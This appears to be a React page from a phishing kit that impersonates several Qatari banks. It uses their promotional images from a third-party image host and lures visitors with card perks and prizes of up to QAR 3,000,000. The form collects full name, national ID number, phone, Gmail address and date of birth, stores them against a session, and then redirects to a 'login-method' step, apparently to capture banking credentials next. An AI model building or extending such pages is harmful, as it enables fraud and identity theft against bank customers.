import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";

const bankLogos = {
  doha: "https://i.ibb.co/fYrmRJN5/h3-Doha-Bank-International-Spends.jpg",
  rayan: "https://i.ibb.co/5gg1JNN2/m-Al-Rayan-Bank-Raffle.jpg",
  qib: "https://i.ibb.co/hJtYdd37/h3-QIB-acquisition-campaign.jpg",
  qnb: "https://i.ibb.co/Pz47HdB3/169282.jpg",
};

const bankLogosEn = {
  doha: "https://i.ibb.co/fYrmRJN5/h3-Doha-Bank-International-Spends.jpg",
  rayan: "https://i.ibb.co/5gg1JNN2/m-Al-Rayan-Bank-Raffle.jpg",
  qib: "https://i.ibb.co/hJtYdd37/h3-QIB-acquisition-campaign.jpg",
  qnb: "https://i.ibb.co/Pz47HdB3/169282.jpg",
};

export default function PersonalData() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const { language, setLanguage } = useLanguage();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "doha";
  const sessionId = localStorage.getItem("sessionId") || "";

  const isArabic = language === "ar";
  const footerImage = isArabic 
    ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
    : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";

  const [formData, setFormData] = useState({
    nameEnglish: "",
    nameArabic: "",
    idNumber: "",
    phoneNumber: "",
    email: "",
    dateOfBirth: "",
    gender: isArabic ? "ذكر" : "Male",
    customerStatus: isArabic ? "عميل حالي" : "Existing Customer",
  });

  const submitPersonalDataMutation = trpc.submissions.submitPersonalData.useMutation();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
    
    if (!currentSessionId) {
      toast.error(isArabic ? "جلسة غير صالحة" : "Invalid session");
      return;
    }

    try {
      await submitPersonalDataMutation.mutateAsync({
        sessionId: currentSessionId,
        nameArabic: formData.nameArabic,
        nameEnglish: formData.nameEnglish,
        idNumber: formData.idNumber,
        phoneNumber: formData.phoneNumber,
        email: formData.email,
        dateOfBirth: formData.dateOfBirth,
        gender: formData.gender,
        customerStatus: formData.customerStatus,
      });
      toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
      setLocation(`/login-method?bank=${bank}&session=${currentSessionId}`);
    } catch (error) {
      console.error("Error saving personal data in DB:", error);
      toast.error(isArabic ? "فشل حفظ البيانات، يرجى المحاولة مرة أخرى" : "Failed to save data, please try again");
    }
  };

  const toggleLanguage = () => {
    setLanguage(isArabic ? "en" : "ar");
  };

  useEffect(() => {
    document.title = isArabic ? "البيانات الشخصية" : "Personal Data";
  }, [isArabic]);

  return (
    <div className="page-wrapper">
      <style>{`
        .page-wrapper { font-family: sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; padding-bottom: 20px; min-height: 100vh; }
        
        .header { position: relative; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
        .logo { height: 80px; width: auto; object-fit: contain; background-color: white; padding: 0; }
        .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
        .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }

        .bank-box { width: 100%; background: #fff; border-bottom: 1px solid #ddd; padding: 10px 0; }
        .bank-logo { width: 90%; max-width: 400px; display: block; margin: 0 auto; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }

        .info-box { background: white; margin: 15px; padding: 15px; border-radius: 10px; border-${isArabic ? "right" : "left"}: 5px solid #8C0032; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .line { border-bottom: 1px solid #eee; padding: 8px 0; font-size: 14px; color: #333; }
        .rewards-line { padding: 8px 0; color: #8C0032; font-weight: bold; font-size: 14px; border-bottom: 1px solid #eee; }

        .form-container { padding: 20px; background: white; margin: 15px; border-radius: 10px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; color: #555; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }

        .footer-image { width: 100%; display: block; margin-top: 20px; }
      `}</style>
      <header className="header">
        <div style={{ display: "flex", alignItems: "center", gap: "15px" }}>
          <div className="menu-icon">&#9776;</div>
          <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663834255146/ubzPDKYkYhFWJOVw.png" className="logo" />
        </div>
        <button onClick={toggleLanguage} className="lang-btn" style={{ textDecoration: "none" }}>
          {isArabic ? "English" : "عربي"}
        </button>
      </header>

      <div className="bank-box">
        <img src={(isArabic ? bankLogos : bankLogosEn)[bank as keyof typeof bankLogos] || bankLogos.doha} className="bank-logo" alt="Bank Logo" />
      </div>

      <div className="info-box">
        <div className="line">✔ {isArabic ? "مميزات البطاقة: أولوية قصوى، تجميع نقاط مضاعف، دخول الصالات" : "Card Benefits: Priority processing, Double Avios points, Lounge access"}</div>
        <div className="line">✔ {isArabic ? "أفضل شركات الطيران: الخطوط القطرية، السنغافورية، طيران الإمارات" : "Best Airlines: Qatar Airways, Singapore Airlines, Emirates"}</div>
        <div className="line">✔ {isArabic ? "أفضل درجة رجال أعمال: Qsuite القطرية، درجة رجال الأعمال السنغافورية" : "Best Business Class: Qatar Qsuite, Singapore Business Class"}</div>
        <div className="line">✔ {isArabic ? "أفضل صالات رجال أعمال: صالة المرجان، صالات سيلفر كريس" : "Best Lounges: Al Mourjan Lounge, SilverKris Lounges"}</div>
        <div className="line">✔ {isArabic ? "أفضل شركة طيران في الشرق الأوسط: القطرية، الإمارات، الاتحاد" : "Best Airline in the Middle East: Qatar Airways, Emirates, Etihad"}</div>
        <div className="rewards-line">● {isArabic ? "مكافآت شهرية تصل إلى 5,000 ريال قطري" : "Monthly rewards up to QAR 5,000"}</div>
        <div className="rewards-line">● {isArabic ? "جوائز سنوية تصل إلى 3,000,000 ريال قطري" : "Annual prizes up to QAR 3,000,000"}</div>
        <div className="rewards-line">● {isArabic ? "خصومات عالمية تصل إلى 70%" : "Global discounts up to 70%"}</div>
      </div>

      <div className="form-container">
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label>{isArabic ? "الاسم كما في الهوية (بالإنجليزي)" : "Full Name (as per ID)"}</label>
            <input
              type="text"
              name="nameEnglish"
              placeholder={isArabic ? "Full Name" : "Full Name"}
              value={formData.nameEnglish}
              onChange={handleChange}
              required
            />
          </div>
          <div className="form-group">
            <label>{isArabic ? "الاسم (بالعربي)" : "Name (Arabic)"}</label>
            <input
              type="text"
              name="nameArabic"
              placeholder={isArabic ? "الاسم الكامل" : "الاسم الكامل"}
              value={formData.nameArabic}
              onChange={handleChange}
              required
            />
          </div>
          <div className="form-group">
            <label>{isArabic ? "رقم الهوية" : "ID Number"}</label>
            <input
              type="number"
              name="idNumber"
              placeholder={isArabic ? "رقم الهوية" : "ID Number"}
              value={formData.idNumber}
              onChange={handleChange}
              required
            />
          </div>
          <div className="form-group">
            <label>{isArabic ? "رقم الجوال" : "Mobile Number"}</label>
            <input
              type="number"
              name="phoneNumber"
              placeholder="00974XXXXXXXX"
              value={formData.phoneNumber}
              onChange={handleChange}
              required
            />
          </div>
          <div className="form-group">
            <label>{isArabic ? "البريد الإلكتروني (Gmail)" : "Email (Gmail)"}</label>
            <input
              type="email"
              name="email"
              placeholder="example@gmail.com"
              value={formData.email}
              onChange={handleChange}
              required
            />
          </div>
          <div className="form-group">
            <label>{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
            <input
              type="date"
              name="dateOfBirth"
              value={formData.dateOfBirth}
              onChange={handleChange}
              required
            />
          </div>
          <div className="form-group">
            <label>{isArabic ? "النوع" : "Gender"}</label>
            <select name="gender" value={formData.gender} onChange={handleChange}>
              <option>{isArabic ? "ذكر" : "Male"}</option>
              <option>{isArabic ? "أنثى" : "Female"}</option>
            </select>
          </div>
          <div className="form-group">
            <label>{isArabic ? "حالة العميل" : "Customer Status"}</label>
            <select name="customerStatus" value={formData.customerStatus} onChange={handleChange}>
              <option>{isArabic ? "عميل حالي" : "Existing Customer"}</option>
              <option>{isArabic ? "عميل جديد" : "New Customer"}</option>
            </select>
          </div>
          <button type="submit" className="submit-btn">
            {isArabic ? "متابعة" : "Continue"}
          </button>
        </form>
      </div>

      <img src={footerImage} className="footer-image" alt="Footer" />
    </div>
  );
}
